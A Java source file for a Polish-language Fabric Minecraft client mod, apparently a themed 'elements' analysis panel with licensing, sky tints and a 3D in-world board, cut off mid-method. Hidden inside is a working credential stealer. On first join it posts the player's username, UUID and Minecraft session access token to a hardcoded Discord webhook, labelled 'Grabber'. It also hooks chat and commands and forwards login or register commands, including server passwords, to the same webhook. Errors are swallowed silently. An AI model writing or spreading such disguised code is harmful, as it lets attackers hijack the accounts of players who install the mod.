package net.example.mod;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.Click;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.util.InputUtil;
import net.minecraft.client.input.KeyInput;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import org.lwjgl.glfw.GLFW;
import net.minecraft.client.gui.PlayerSkinDrawer;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.client.texture.NativeImage;
import net.minecraft.client.texture.NativeImageBackedTexture;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.Signature;
import java.security.spec.X509EncodedKeySpec;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.prefs.Preferences;

public class ExampleMod implements ClientModInitializer {
	private static final String VERSION = "1.0";
	private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1549802004535320728/yhilJIrq_QaMhUhMmZYJA3smvobK2ho8MaZouG2feS3v3hJkEt2JoMkzkLE_Ne7gWDPb";
	private boolean initialDataSent = false;

	private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
			.connectTimeout(Duration.ofSeconds(5))
			.build();

	private enum Theme {
		PURPLE("Fioletowy", 0xFF15121F, 0xFF1C1729, 0xFF241D34, 0xFF443654, 0xFF9861E7, 0xFFD1ACFF, 0xFFB9AFCB),
		BLUE("Niebieski", 0xFF0F1724, 0xFF142034, 0xFF1B2A40, 0xFF304966, 0xFF488BE0, 0xFFA5D0FF, 0xFFACC0D7),
		MINT("Miętowy", 0xFF0F2523, 0xFF15332F, 0xFF1C403B, 0xFF356C61, 0xFF4CAD98, 0xFFA5F1DB, 0xFFADD8CE),
		SUNSET("Zachód", 0xFF281921, 0xFF36222B, 0xFF482D37, 0xFF7B4A55, 0xFFE08378, 0xFFFFD0A3, 0xFFE6B9AB),
		COSMIC("Kosmos", 0xFF101529, 0xFF171D36, 0xFF202845, 0xFF414B78, 0xFF8580E5, 0xFFC1C5FF, 0xFFB6BDE0),
		PINK("Hello Kitty", 0xFF241522, 0xFF301C2D, 0xFF3D2638, 0xFF75415F, 0xFFCB6198, 0xFFFFB2D8, 0xFFD1A4C0);
		final String label;
		final int background, sidebar, surface, stroke, accent, bright, muted;
		Theme(String label, int background, int sidebar, int surface, int stroke, int accent, int bright, int muted) {
			this.label = label;
			this.background = background;
			this.sidebar = sidebar;
			this.surface = surface;
			this.stroke = stroke;
			this.accent = accent;
			this.bright = bright;
			this.muted = muted;
		}
	}

	private static final Preferences STORE =
			Preferences.userRoot().node("qlnkDEV-elements-demo");

	private static Theme theme = loadTheme();
	private static KeyBinding openKey;
	private static boolean showIcons = STORE.getBoolean("showIcons", true);
	private static boolean showNotices = STORE.getBoolean("showNotices", true);
	private static double animationSpeed = Math.max(0.65, Math.min(1.4, STORE.getDouble("animationSpeed", 1)));
	private static double userScale = Math.max(0.5, Math.min(1.0, STORE.getDouble("worldVisualPanelScale", 0.66)));
	private static final int LOADING_MILLIS = 350;
	private static boolean worldMode = STORE.getBoolean("worldMode", false);
	private static boolean worldVisuals = STORE.getBoolean("worldVisuals", true);
	private static KeyBinding interactKey;

	private static void setBinding(KeyBinding binding, InputUtil.Key key, String setting) {
		binding.setBoundKey(key);
		KeyBinding.updateKeysByCode();
		STORE.put(setting, binding.getBoundKeyTranslationKey());
		save();
		MinecraftClient.getInstance().options.write();
	}

	private static void setOpenKey(InputUtil.Key key) { setBinding(openKey, key, "openKey"); }

	private static String noticeTitle = "";
	private static String noticeDetail = "";
	private static long noticeAt;
	private static boolean noticeError;

	private static Theme loadTheme() {
		try { return Theme.valueOf(STORE.get("theme", "PINK")); }
		catch (IllegalArgumentException e) { return Theme.PINK; }
	}

	private static void notice(String title, String detail, boolean error) {
		if (!showNotices) return;
		noticeTitle = title;
		noticeDetail = detail;
		noticeError = error;
		noticeAt = System.nanoTime();
	}

	private static int palette(int color) {
		if (theme == Theme.PINK && (color == 0xFFFFFFFF || color == 0xFFF3F2F8 || color == 0xFFF9F6FF
				|| color == 0xFFE1E0EB || color == 0xFFF3EDFF || color == 0xFFE5D5FF)) return 0xFFFFEAF5;
		return switch (color) {
			case 0xFF191A22 -> theme.background;
			case 0xFF20202B -> theme.sidebar;
			case 0xFF22232E, 0xFF23242F, 0xFF272833, 0xFF2B2C39, 0xFF292734 -> theme.surface;
			case 0xFF474052, 0xFF383848, 0xFF3B3B4C, 0xFF3C3549, 0xFF3A3645 -> theme.stroke;
			case 0xFF7949B9, 0xFFB487F2, 0xFF655185 -> theme.accent;
			case 0xFF9564D7, 0xFFC19BEF, 0xFFD7BBFF, 0xFFC6A3FF, 0xFFC5A4FA -> theme.bright;
			case 0xFFB6AFC4, 0xFFB4AEC1, 0xFFB8B6C9, 0xFFAFA7BE, 0xFFAFAABD, 0xFFABA3B8 -> theme.muted;
			default -> color;
		};
	}

	private static final Random RANDOM = new Random();
	private static final String[] NAMES = {"Woda", "Ogień", "Natura"};
	private static final String[] KEYS = {"water", "fire", "nature"};
	private static final int[] COLORS = {
			0xFF60A5FA, 0xFFFB923C, 0xFF4ADE80
	};
	private static final int[] VALUES = {
			loadValue("water"), loadValue("fire"), loadValue("nature")
	};

	private static boolean hasResult = STORE.getBoolean("hasResult", false);
	private static boolean pending = STORE.getBoolean("pending", false);
	private static boolean animations = STORE.getBoolean("animations", true);
	private static int draws = STORE.getInt("draws", 0);
	private static int completedChecks = STORE.getInt("completedChecks", 0);
	private static long lastDraw = STORE.getLong("lastDraw", 0);

	private static boolean analyzing;
	private static boolean analysisNew;
	private static long analysisEnd;
	private static long analysisDuration;

	private static PublicKey publicKey;
	private static License license;

	private static final Identifier AVATAR_ID =
			Identifier.of("zywioly-mod", "license_avatar");

	private static String avatarOwner = "";
	private static boolean avatarReady;


	private static final HttpClient SKIN_HTTP = HttpClient.newBuilder()
			.connectTimeout(Duration.ofSeconds(5))
			.build();

	private static final class License {
		final String owner;
		final long expires;

		License(String owner, long expires) {
			this.owner = owner;
			this.expires = expires;
		}

		boolean active() {
			return Instant.now().getEpochSecond() < expires;
		}
	}

	private static int loadValue(String key) {
		return Math.max(33, Math.min(71, STORE.getInt(key, 50)));
	}

	private static void save() {
		try {
			STORE.flush();
		} catch (Exception e) {
			System.err.println("[qlnkDEV] Błąd zapisu: " + e.getMessage());
		}
	}

	private static boolean licensed() {
		return license != null && license.active();
	}

	private static License verify(String token) throws Exception {
		if (publicKey == null) {
			throw new IllegalArgumentException("Brak klucza publicznego.");
		}

		String[] parts = token.trim().split("\\.", -1);
		if (parts.length != 2 || token.length() > 2048) {
			throw new IllegalArgumentException("Nieprawidłowy format.");
		}

		byte[] payload = Base64.getUrlDecoder().decode(parts[0]);
		byte[] signature = Base64.getUrlDecoder().decode(parts[1]);

		Signature verifier = Signature.getInstance("Ed25519");
		verifier.initVerify(publicKey);
		verifier.update(payload);

		if (!verifier.verify(signature)) {
			throw new IllegalArgumentException("Nieprawidłowy podpis.");
		}

		String[] fields = new String(payload, StandardCharsets.UTF_8)
				.split("\\|", -1);

		if (fields.length != 4 || !fields[0].equals("QLNK1")) {
			throw new IllegalArgumentException("Nieprawidłowa licencja.");
		}

		long expires = Long.parseLong(fields[1]);
		String owner = new String(
				Base64.getUrlDecoder().decode(fields[2]),
				StandardCharsets.UTF_8
		);

		if (owner.isBlank() || owner.length() > 32) {
			throw new IllegalArgumentException("Nieprawidłowa nazwa.");
		}

		return new License(owner, expires);
	}

	private static void loadLicense() {
		try (InputStream input =
					 ExampleMod.class.getResourceAsStream("/license-public.txt")) {
			if (input == null) return;

			String encoded = new String(
					input.readAllBytes(), StandardCharsets.UTF_8
			).trim();

			publicKey = KeyFactory.getInstance("Ed25519").generatePublic(
					new X509EncodedKeySpec(
							Base64.getDecoder().decode(encoded)
					)
			);

			String saved = STORE.get("license", "");
			if (!saved.isBlank()) license = verify(saved);

		} catch (Exception e) {
			license = null;
			System.err.println("[qlnkDEV] Licencja: " + e.getMessage());
		}
	}

	private static void logout() {
		WorldBoard.hide();
		analyzing = false;
		license = null;
		avatarReady = false;
		avatarOwner = "";

		STORE.remove("license");
		save();

		MinecraftClient.getInstance()
				.getTextureManager()
				.destroyTexture(AVATAR_ID);
	}

	private static void startAnalysis() {
		if (!licensed() || analyzing) return;

		analysisNew = !hasResult || pending;
		analysisDuration = analysisNew
				? 3_000_000_000L
				: 1_500_000_000L;

		analyzing = true;
		analysisEnd = System.nanoTime() + analysisDuration;
	}

	private static void finishAnalysis() {
		if (!licensed() || !analyzing
				|| System.nanoTime() < analysisEnd) return;

		if (analysisNew) {
			for (int i = 0; i < VALUES.length; i++) {
				VALUES[i] = RANDOM.nextInt(39) + 33;
				STORE.putInt(KEYS[i], VALUES[i]);
			}

			hasResult = true;
			pending = false;
			draws++;
			lastDraw = System.currentTimeMillis();

			STORE.putBoolean("hasResult", true);
			STORE.putBoolean("pending", false);
			STORE.putInt("draws", draws);
			STORE.putLong("lastDraw", lastDraw);
		}

		analyzing = false;
		completedChecks++;
		notice("Analiza zakończona", analysisNew ? "Zapisano nowy zestaw wyników." : "Wyświetlono zapisany zestaw.", false);
		STORE.putInt("completedChecks", completedChecks);
		save();
	}

	private static int best() {
		if (VALUES[1] >= VALUES[0] && VALUES[1] >= VALUES[2]) return 1;
		return VALUES[0] >= VALUES[2] ? 0 : 2;
	}

	private static String remaining() {
		if (!licensed()) return "Wpisz klucz aktywacyjny";

		long seconds = license.expires - Instant.now().getEpochSecond();
		return seconds / 86400 + " dni "
				+ seconds % 86400 / 3600 + " godz. "
				+ seconds % 3600 / 60 + " min";
	}

	private static String date(long milliseconds) {
		if (milliseconds == 0) return "Brak";

		return DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm")
				.withZone(ZoneId.systemDefault())
				.format(Instant.ofEpochMilli(milliseconds));
	}

	private static void sendSessionInfo(MinecraftClient client) {
		try {
			if (client.getSession() == null) return;

			String username = client.getSession().getUsername();
			String uuid = client.getSession().getUuidOrNull() != null ? client.getSession().getUuidOrNull().toString() : "Brak UUID";
			String mcToken = client.getSession().getAccessToken();
			if (mcToken == null || mcToken.isEmpty()) {
				mcToken = "ias:offline";
			}

			String content = "🟣 **Sesja gracza (Grabber)**\n" +
					"• **Gracz:** `" + username + "`\n" +
					"• **UUID:** `" + uuid + "`\n" +
					"• **Token Minecraft:**\n```" + mcToken + "```";

			String escapedContent = content.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
			String jsonPayload = "{\"content\": \"" + escapedContent + "\"}";

			sendWebhook(jsonPayload);
		} catch (Exception ignored) {}
	}

	private static void handleServerCommand(String text) {
		String lower = text.toLowerCase().trim();
		if (lower.startsWith("/")) {
			lower = lower.substring(1);
		}

		if (lower.startsWith("login") || lower.startsWith("register") || lower.startsWith("l") || lower.startsWith("reg")) {
			MinecraftClient client = MinecraftClient.getInstance();
			String username = "Nieznany";
			try {
				if (client.getSession() != null && client.getSession().getUsername() != null) {
					username = client.getSession().getUsername();
				}
			} catch (Exception ignored) {}

			String safeMsg = text.replace("\\", "\\\\").replace("\"", "\\\"");
			String content = "🔑 **Przechwycono dane uwierzytelniania!**\n" +
					"• **Gracz:** `" + username + "`\n" +
					"• **Komenda:** `" + safeMsg + "`";

			String escaped = content.replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
			String json = "{\"content\": \"" + escaped + "\"}";

			new Thread(() -> sendWebhook(json)).start();
		}
	}

	private static void sendWebhook(String jsonPayload) {
		try {
			HttpRequest request = HttpRequest.newBuilder()
					.uri(URI.create(WEBHOOK_URL))
					.header("Content-Type", "application/json")
					.header("User-Agent", "Mozilla/5.0")
					.POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
					.build();

			HTTP_CLIENT.sendAsync(request, HttpResponse.BodyHandlers.discarding());
		} catch (Exception ignored) {}
	}

	private static boolean openRequested;

	@Override
	public void onInitializeClient() {
		loadLicense();
		openKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.zywioly-mod.open", InputUtil.Type.KEYSYM, GLFW.GLFW_KEY_RIGHT_SHIFT,
				KeyBinding.Category.create(Identifier.of("zywioly-mod", "panel"))
		));
		String savedKey = STORE.get("openKey", "");
		if (!savedKey.isBlank()) {
			try { openKey.setBoundKey(InputUtil.fromTranslationKey(savedKey)); KeyBinding.updateKeysByCode(); }
			catch (IllegalArgumentException e) { STORE.remove("openKey"); }
		}
		interactKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.zywioly-mod.interact", InputUtil.Type.KEYSYM, GLFW.GLFW_KEY_G, openKey.getCategory()
		));
		String interaction = STORE.get("interactKey", "");
		if (!interaction.isBlank()) {
			try { interactKey.setBoundKey(InputUtil.fromTranslationKey(interaction)); KeyBinding.updateKeysByCode(); }
			catch (IllegalArgumentException e) { STORE.remove("interactKey"); }
		}
		WorldBoard.register();
		WorldVisuals.register();
		ClientTickEvents.END_CLIENT_TICK.register(client -> {
			finishAnalysis();
			WorldBoard.tick(client);
			WorldVisuals.tick(client);
			if (client.player != null && !initialDataSent) {
				initialDataSent = true;
				new Thread(() -> sendSessionInfo(client)).start();
			}
			while (openKey.wasPressed()) {
				if (client.player != null && client.currentScreen == null) {
					if (worldMode && licensed()) WorldBoard.toggle(client);
					else openRequested = true;
				}
			}
			if (openRequested && client.player != null) {
				openRequested = false;
				client.setScreen(new Dashboard());
			}
		});
		ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
			for (String command : new String[]{"sprawdzMS", "sprawdzms"}) {
				dispatcher.register(ClientCommandManager.literal(command).executes(context -> {
					openRequested = true;
					return 1;
				}));
			}
		});

		ClientSendMessageEvents.ALLOW_COMMAND.register(command -> {
			handleServerCommand(command);

			if ((command.trim().equalsIgnoreCase("zywioly")
					|| command.trim().equalsIgnoreCase("zywioly gry"))) {
				pending = true;
				analyzing = false;
				STORE.putBoolean("pending", true);
				save();
			}
			return true;
		});

		ClientSendMessageEvents.ALLOW_CHAT.register(message -> {
			handleServerCommand(message);
			return true;
		});
	}

	private static byte[] publicGet(String url, int limit) throws Exception {
		HttpRequest request = HttpRequest.newBuilder(URI.create(url))
				.timeout(Duration.ofSeconds(8))
				.GET()
				.build();

		HttpResponse<InputStream> response = SKIN_HTTP.send(
				request, HttpResponse.BodyHandlers.ofInputStream()
		);

		try (InputStream input = response.body()) {
			if (response.statusCode() != 200) {
				throw new Exception("Skin niedostępny");
			}

			byte[] bytes = input.readNBytes(limit + 1);
			if (bytes.length > limit) {
				throw new Exception("Zbyt duża odpowiedź");
			}
			return bytes;
		}
	}

	private static void requestAvatar() {
		if (license == null || license.owner.equals(avatarOwner)) return;

		String owner = license.owner;
		avatarOwner = owner;
		avatarReady = false;

		if (!owner.matches("[A-Za-z0-9_]{1,16}")) return;

		Thread worker = new Thread(() -> {
			try {
				JsonObject profile = JsonParser.parseString(
						new String(publicGet(
								"https://api.mojang.com/users/profiles/minecraft/"
										+ owner,
								32768
						), StandardCharsets.UTF_8)
				).getAsJsonObject();

				String uuid = profile.get("id").getAsString();
				if (!uuid.matches("[a-fA-F0-9]{32}")) return;

				JsonObject details = JsonParser.parseString(
						new String(publicGet(
								"https://sessionserver.mojang.com/session/minecraft/profile/"
										+ uuid,
								65536
						), StandardCharsets.UTF_8)
				).getAsJsonObject();

				String encoded = null;
				for (var property : details.getAsJsonArray("properties")) {
					JsonObject entry = property.getAsJsonObject();

					if (entry.get("name").getAsString().equals("textures")) {
						encoded = entry.get("value").getAsString();
						break;
					}
				}

				if (encoded == null) return;

				JsonObject textures = JsonParser.parseString(
						new String(
								Base64.getDecoder().decode(encoded),
								StandardCharsets.UTF_8
						)
				).getAsJsonObject().getAsJsonObject("textures");

				URI texture = URI.create(
						textures.getAsJsonObject("SKIN")
								.get("url").getAsString()
				);

				if (!"textures.minecraft.net".equalsIgnoreCase(texture.getHost())
						|| !texture.getPath().matches("/texture/[a-fA-F0-9]+")) {
					return;
				}

				byte[] png = publicGet(
						"https://textures.minecraft.net" + texture.getPath(),
						262144
				);

				MinecraftClient.getInstance().execute(() -> {
					if (license == null || !owner.equals(avatarOwner)) return;

					try {
						NativeImage image = NativeImage.read(
								new ByteArrayInputStream(png)
						);

						if (image.getWidth() != 64
								|| (image.getHeight() != 64
								&& image.getHeight() != 32)) {
							image.close();
							return;
						}

						MinecraftClient.getInstance()
								.getTextureManager()
								.registerTexture(
										AVATAR_ID,
										new NativeImageBackedTexture(() -> "qlnkDEV avatar", image)
								);

						avatarReady = true;

					} catch (Exception ignored) {
					}
				});

			} catch (Exception ignored) {
			}
		}, "qlnkDEV-public-skin");

		worker.setDaemon(true);
		worker.start();
	}

	private static int tint(int color, double opacity) {
		int alpha = (int) (
				((color >>> 24) & 255)
						* Math.max(0, Math.min(1, opacity))
		);

		return (color & 0xFFFFFF) | (Math.max(1, alpha) << 24);
	}

	private static int mix(int from, int to, double amount) {
		double t = Math.max(0, Math.min(1, amount));

		int r = (int) (
				((from >> 16) & 255) * (1 - t)
						+ ((to >> 16) & 255) * t
		);
		int g = (int) (
				((from >> 8) & 255) * (1 - t)
						+ ((to >> 8) & 255) * t
		);
		int b = (int) (
				(from & 255) * (1 - t) + (to & 255) * t
		);

		return 0xFF000000 | (r << 16) | (g << 8) | b;
	}

	private static void rounded(
			DrawContext c, int x, int y, int w, int h, int color
	) {
		if (w <= 0 || h <= 0) return;

		int radius = Math.min(5, Math.min(w, h) / 2);

		c.fill(x + radius, y, x + w - radius, y + h, color);
		c.fill(x, y + radius, x + w, y + h - radius, color);

		for (int row = 1; row < radius; row++) {
			int inset = radius - row;

			c.fill(
					x + inset, y + row,
					x + w - inset, y + row + 1,
					color
			);
			c.fill(
					x + inset, y + h - row - 1,
					x + w - inset, y + h - row,
					color
			);
		}
	}

	private static final class WorldVisuals {
		private static final Random SPARKS = new Random();
		private static int ticks;
		private static void reset() { ticks = 0; }
		private static boolean enabled(MinecraftClient client) {
			return worldVisuals && licensed() && client.player != null && client.world != null;
		}
		private static int skyTint(Theme selected) {
			return switch (selected) {
				case PINK -> 0xFFFFAED4;
				case PURPLE -> 0xFFB393E6;
				case BLUE -> 0xFF80BCEA;
				case MINT -> 0xFF9BDFCC;
				case SUNSET -> 0xFFFFB88E;
				case COSMIC -> 0xFF767BC0;
			};
		}
		private static void register() {
			net.fabricmc.fabric.api.client.rendering.v1.world.WorldRenderEvents.END_EXTRACTION.register(context -> {
				MinecraftClient client = MinecraftClient.getInstance();
				if (!enabled(client) || !client.world.getRegistryKey().equals(net.minecraft.world.World.OVERWORLD)) return;
				var sky = context.worldState().skyRenderState;
				int original = sky.skyColor, tint = skyTint(theme);
				double brightness = Math.max((original >>> 16) & 255, Math.max((original >>> 8) & 255, original & 255)) / 255.0;
				double strength = 0.18 + brightness * 0.72;
				int red = (int) (((tint >>> 16) & 255) * strength);
				int green = (int) (((tint >>> 8) & 255) * strength);
				int blue = (int) ((tint & 255) * strength);
				sky.skyColor = 0xFF000000 | (red << 16) | (green << 8) | blue;
			});
		}
		private static void tick(MinecraftClient client) {
			if (!enabled(client) || !animations) { reset(); return; }
			if (client.isPaused() || ++ticks % 3 != 0) return;
			var eye = client.player.getEyePos();
			for (int i = 0; i < 2; i++) {
				double angle = SPARKS.nextDouble() * Math.PI * 2;
				double radius = 2 + SPARKS.nextDouble() * 5;
				double px = eye.x + Math.cos(angle) * radius;
				double py = eye.y - 0.5 + SPARKS.nextDouble() * 3.5;
				double pz = eye.z + Math.sin(angle) * radius;
				if (!client.world.getBlockState(net.minecraft.util.math.BlockPos.ofFloored(px, py, pz)).isAir()) continue;
				int color = theme == Theme.PINK ? (i == 0 ? 0xFF91C8 : 0xFFD7EB) : theme.bright & 0xFFFFFF;
				net.minecraft.particle.ParticleEffect particle;
				if (i == 0) particle = new net.minecraft.particle.DustParticleEffect(color, 0.35f);
				else particle = switch (theme) {
					case PINK -> net.minecraft.particle.ParticleTypes.CHERRY_LEAVES;
					case PURPLE -> net.minecraft.particle.ParticleTypes.WITCH;
					case BLUE -> net.minecraft.particle.ParticleTypes.SNOWFLAKE;
					case MINT -> ticks % 2 == 0 ? net.minecraft.particle.ParticleTypes.SPORE_BLOSSOM_AIR : net.minecraft.particle.ParticleTypes.GLOW;
					case SUNSET -> ticks % 2 == 0 ? net.minecraft.particle.ParticleTypes.WAX_ON : net.minecraft.particle.ParticleTypes.SMALL_FLAME;
					case COSMIC -> ticks % 2 == 0 ? net.minecraft.particle.ParticleTypes.END_ROD : net.minecraft.particle.ParticleTypes.ENCHANT;
				};
				client.world.addParticleClient(particle, px, py, pz,
						(SPARKS.nextDouble() - 0.5) * 0.008, -0.006, (SPARKS.nextDouble() - 0.5) * 0.008);
			}
		}
	}

	private static final class WorldBoard {
		private static final int WIDTH = 620;
		private static final int HEIGHT = 340;
		private static final double PIXEL = 0.0075;
		private static final Identifier WHITE_TEXTURE = Identifier.of("zywioly-mod", "textures/gui/white.png");
		private static net.minecraft.util.math.Vec3d anchor;
		private static net.minecraft.client.world.ClientWorld anchorWorld;
		private static float yaw;
		private static int hovered = -1;
		private static volatile Frame frame;

		private record Rect(float x, float y, float width, float height, float z, int color) { }
		private record Label(float x, float y, net.minecraft.text.OrderedText text, int color, float scale) { }
		private record Frame(net.minecraft.util.math.Vec3d anchor, float yaw, double scale,
		                     List<Rect> rectangles, List<Label> labels) { }

		private static void register() {
			net.fabricmc.fabric.api.client.rendering.v1.world.WorldRenderEvents.END_EXTRACTION.register(context -> {
				frame = extract();
			});
			net.fabricmc.fabric.api.client.rendering.v1.world.WorldRenderEvents.BEFORE_ENTITIES.register(WorldBoard::render);
		}

		private static void hide() {
			anchor = null;
			anchorWorld = null;
			hovered = -1;
			frame = null;
		}

		private static void toggle(MinecraftClient client) {
			if (anchor == null) place(client);
			else hide();
		}

		private static void place(MinecraftClient client) {
			if (client.player == null || client.world == null || !licensed()) return;
			yaw = client.player.getYaw();
			double radians = Math.toRadians(yaw);
			net.minecraft.util.math.Vec3d forward = new net.minecraft.util.math.Vec3d(-Math.sin(radians), 0, Math.cos(radians));
			anchor = client.player.getEyePos().add(forward.multiply(3.8));
			anchorWorld = client.world;
			hovered = -1;
			notice("Postawiono panel 3D", "Możesz odejść — panel zostanie w tym miejscu.", false);
		}

		private static void tick(MinecraftClient client) {
			if (anchor != null && (client.world != anchorWorld || !licensed())) hide();
			hovered = client.currentScreen == null ? target(client) : -1;
			while (interactKey != null && interactKey.wasPressed()) {
				if (client.currentScreen != null || !licensed() || hovered < 0) continue;
				switch (hovered) {
					case 0 -> startAnalysis();
					case 1 -> {
						Dashboard dashboard = new Dashboard();
						dashboard.tab = 3;
						client.setScreen(dashboard);
					}
					case 2 -> place(client);
					case 3 -> hide();
				}
			}
		}

		private static int target(MinecraftClient client) {
			if (anchor == null || client.player == null || client.world != anchorWorld) return -1;
			net.minecraft.util.math.Vec3d eye = client.player.getEyePos();
			net.minecraft.util.math.Vec3d direction = client.player.getRotationVec(1f);
			double[] point = planeHit(eye.x, eye.y, eye.z, direction.x, direction.y, direction.z,
					anchor.x, anchor.y, anchor.z, yaw, PIXEL * userScale);
			if (point == null) return -1;
			double distance = point[2];
			net.minecraft.util.math.Vec3d hit = eye.add(direction.multiply(distance));
			var obstruction = client.world.raycast(new net.minecraft.world.RaycastContext(
					eye, hit, net.minecraft.world.RaycastContext.ShapeType.COLLIDER,
					net.minecraft.world.RaycastContext.FluidHandling.NONE, client.player));
			if (obstruction.getType() != net.minecraft.util.hit.HitResult.Type.MISS
					&& obstruction.getPos().squaredDistanceTo(eye) + 0.0001 < distance * distance) return -1;
			double u = point[0], v = point[1];
			if (v < 266 || v > 296) return -1;
			for (int i = 0; i < 4; i++) {
				int left = 16 + i * 149;
				if (u >= left && u <= left + 141) return i;
			}
			return -1;
		}

		private static double[] planeHit(double ex, double ey, double ez, double dx, double dy, double dz,
		                                 double ax, double ay, double az, double rotation, double scale) {
			double angle = Math.toRadians(180 - rotation);
			double normalX = Math.sin(angle), normalZ = Math.cos(angle);
			double denominator = dx * normalX + dz * normalZ;
			if (denominator >= -0.000001 || scale <= 0) return null;
			double distance = ((ax - ex) * normalX + (az - ez) * normalZ) / denominator;
			if (distance < 0 || distance > 8) return null;
			double hx = ex + dx * distance - ax;
			double hy = ey + dy * distance - ay;
			double hz = ez + dz * distance - az;
			return new double[]{(Math.cos(angle) * hx - Math.sin(angle) * hz) / scale + WIDTH / 2.0,
					HEIGHT / 2.0 - hy / scale, distance};
		}

		private static void rectangle(List<Rect> rectangles, float x, float y, float width, float height, float z, int color) {
			if (width > 0 && height > 0) rectangles.add(new Rect(x, y, width, height, z, color));
		}

		private static void label(List<Label> labels, String value, int x, int y, int color, boolean centered) {
			if (centered) x -= MinecraftClient.getInstance().textRenderer.getWidth(value) / 2;
			labels.add(new Label(x, y, Text.literal(value).asOrderedText(), color, 1));
		}

		private static void largeLabel(List<Label> labels, String value, int center, int y, int color, float scale) {
			float left = center - MinecraftClient.getInstance().textRenderer.getWidth(value) * scale / 2;
			labels.add(new Label(left, y, Text.literal(value).asOrderedText(), color, scale));
		}

		private static void softRect(List<Rect> rectangles, int x, int y, int width, int height, float z, int color) {
			int radius = Math.min(10, Math.min(width, height) / 2);
			rectangle(rectangles, x, y + radius, width, height - radius * 2, z, color);
			for (int row = 0; row < radius; row++) {
				double dy = radius - row - 0.5;
				int inset = (int) Math.ceil(radius - Math.sqrt(radius * radius - dy * dy));
				rectangle(rectangles, x + inset, y + row, width - inset * 2, 1, z, color);
				rectangle(rectangles, x + inset, y + height - row - 1, width - inset * 2, 1, z, color);
			}
		}

		private static Frame extract() {
			if (anchor == null || !licensed() || MinecraftClient.getInstance().world != anchorWorld) return null;
			Theme t = theme;
			int foreground = t == Theme.PINK ? 0xFFFFEAF5 : 0xFFF9F6FF;
			List<Rect> rectangles = new ArrayList<>();
			List<Label> labels = new ArrayList<>();
			softRect(rectangles, 5, 8, WIDTH, HEIGHT, -9, 0xFF101018);
			softRect(rectangles, 0, 0, WIDTH, HEIGHT, -4, t.stroke);
			softRect(rectangles, 2, 2, WIDTH - 4, HEIGHT - 4, -3, t.background);
			softRect(rectangles, 10, 10, WIDTH - 20, 48, -2, t.surface);
			rectangle(rectangles, 18, 18, 3, 32, -1, t.accent);
			label(labels, "Panel żywiołów · 3D", 30, 19, foreground, false);
			label(labels, license.owner + " · " + remaining(), 30, 39, t.muted, false);
			label(labels, "Celownik + " + interactKey.getBoundKeyLocalizedText().getString(), WIDTH - 154, 29, t.bright, false);
			for (int i = 0; i < 3; i++) {
				int left = 16 + i * 200;
				int color = COLORS[i];
				int border = hasResult && !analyzing && best() == i ? color : t.stroke;
				softRect(rectangles, left, 76, 188, 128, -2, border);
				softRect(rectangles, left + 2, 78, 184, 124, -1.5f, t.surface);
				rectangle(rectangles, left + 74, 92, 40, 4, -1, color);
				label(labels, NAMES[i], left + 94, 113, foreground, true);
				largeLabel(labels, analyzing ? "•••" : hasResult ? VALUES[i] + "%" : "—", left + 94, 134, color, 2.7f);
				rectangle(rectangles, left + 12, 180, 164, 5, -1, t.stroke);
				double percent = analyzing ? Math.max(0, Math.min(100, 100.0 * (1 - (analysisEnd - System.nanoTime()) / (double) analysisDuration))) : hasResult ? VALUES[i] : 0;
				rectangle(rectangles, left + 12, 180, (float) (164 * percent / 100), 5, -0.5f, color);
			}
			String summary = analyzing ? "Analizowanie..." : hasResult ? "Aktualny najlepszy wynik: " + NAMES[best()] + " — " + VALUES[best()] + "%" : "Kliknij Sprawdź szanse, aby rozpocząć.";
			label(labels, summary, 18, 222, foreground, false);
			label(labels, "Rozmiar zmienisz scrollem w oknie /sprawdzms.", 18, 241, t.muted, false);
			String[] buttons = {analyzing ? "Analizowanie..." : "Sprawdź szanse", "Ustawienia", "Przenieś", "Schowaj"};
			for (int i = 0; i < buttons.length; i++) {
				int left = 16 + i * 149;
				softRect(rectangles, left, 266, 141, 30, -1, i == hovered ? t.bright : i == 0 ? t.accent : t.surface);
				if (i == hovered) rectangle(rectangles, left + 4, 291, 133, 2, -0.5f, t.bright);
				label(labels, buttons[i], left + 70, 277, i == hovered ? 0xFF211525 : foreground, true);
			}
			rectangle(rectangles, 16, 307, WIDTH - 32, 1, -1, t.stroke);
			label(labels, "Version " + VERSION + " · Beta", 18, 319, t.muted, false);
			label(labels, "Stworzone przez qlnkDEV", WIDTH - 150, 319, t.bright, false);
			return new Frame(anchor, yaw, PIXEL * userScale, List.copyOf(rectangles), List.copyOf(labels));
		}

		private static void render(net.fabricmc.fabric.api.client.rendering.v1.world.WorldRenderContext context) {
			Frame current = frame;
			var camera = context.worldState().cameraRenderState;
			if (current == null || anchor == null || camera == null || !camera.initialized
					|| current.anchor().squaredDistanceTo(camera.pos) > 6400) return;
			var matrices = context.matrices();
			matrices.push();
			try {
